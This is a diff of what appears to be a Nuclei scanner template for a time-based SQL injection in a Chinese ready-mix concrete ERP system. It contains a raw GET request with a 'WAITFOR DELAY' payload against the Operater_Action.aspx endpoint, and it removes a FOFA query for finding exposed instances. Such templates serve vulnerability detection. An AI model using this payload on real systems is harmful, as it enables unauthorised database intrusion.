@@ -3,12 +3,8 @@ info:
   name: 商混ERP系统 operater-action sql注入
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/yg17ytimge2p7155'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: yg17ytimge2p7155
-    fofa: title="商混ERP系统" || body="商混ERP系统"
 http:
 - raw:
   - 'GET /Dispatch/Operater_Action.aspx?action=TaskComplete&id=''WAITFOR+DELAY+''0:0:5''-- HTTP/1.1
